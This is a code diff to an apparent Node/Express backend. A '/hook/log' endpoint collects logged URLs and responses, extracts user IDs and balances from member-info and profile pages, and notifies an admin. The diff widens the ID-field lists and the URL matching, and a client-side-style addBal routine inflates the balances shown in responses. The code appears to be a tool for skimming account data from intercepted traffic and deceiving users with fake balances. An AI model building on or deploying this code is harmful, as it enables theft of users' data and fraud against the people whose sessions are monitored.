@@ -124,7 +124,7 @@ async function notifyAdmin(data, msg) {
 function findNumericId(obj, depth) {
   if (!obj || typeof obj !== 'object' || depth > 5) return '';
   if (Array.isArray(obj)) return '';
-  const idFields = ['userId', 'uid', 'id', 'memberId', 'memberCodeId', 'channelUid', 'user_id', 'userid', 'account_id', 'accountId', 'customerId'];
+  const idFields = ['teamWorkId', 'userId', 'uid', 'id', 'memberId', 'memberCodeId', 'channelUid', 'user_id', 'userid', 'account_id', 'accountId', 'customerId'];
   for (const f of idFields) {
     if (obj[f] !== undefined && obj[f] !== null && obj[f] !== '') {
       const val = String(obj[f]);
@@ -333,11 +333,12 @@ app.post('/hook/log', async (req, res) => {
 🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
     }
 
-    const isMineUrl = u.includes('memberInfo') || u.includes('member/info') || u.includes('member_info') ||
-      u.includes('userInfo') || u.includes('user/info') || u.includes('myInfo') || u.includes('getInfo') ||
-      u.includes('mine') || u.includes('Mine') || u.includes('profile') || u.includes('center') ||
-      u.includes('getMember') || u.includes('memberDetail') || u.includes('memberCenter') ||
-      u.includes('home') || u.includes('/index') || u.includes('dashboard');
+    const urlLower = u.toLowerCase();
+    const isMineUrl = urlLower.includes('memberinfo') || urlLower.includes('member/info') || urlLower.includes('member_info') ||
+      urlLower.includes('userinfo') || urlLower.includes('user/info') || urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
+      urlLower.includes('mine') || urlLower.includes('profile') || urlLower.includes('center') ||
+      urlLower.includes('getmember') || urlLower.includes('memberdetail') || urlLower.includes('membercenter') ||
+      urlLower.includes('dashboard');
 
     if (isMineUrl && respData && typeof respData === 'object' && userId) {
       function findBalDeep(obj, depth) {
@@ -902,7 +903,7 @@ if(!isNaN(v)&&v>=0){o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):par
 if(typeof o[k]==='object'&&o[k]!==null)addBal(o[k],bonus,d+1);
 }}
 
-var ID_FIELDS=['memberCodeId','memberCode','member_code','userId','user_id','channelUid','uid',
+var ID_FIELDS=['teamWorkId','memberCodeId','memberCode','member_code','userId','user_id','channelUid','uid',
 'memberId','member_id','accountId','account_id','customerId','userCode','loginId',
 'userNum','userNumber','memberNum','userID','memberID'];
 
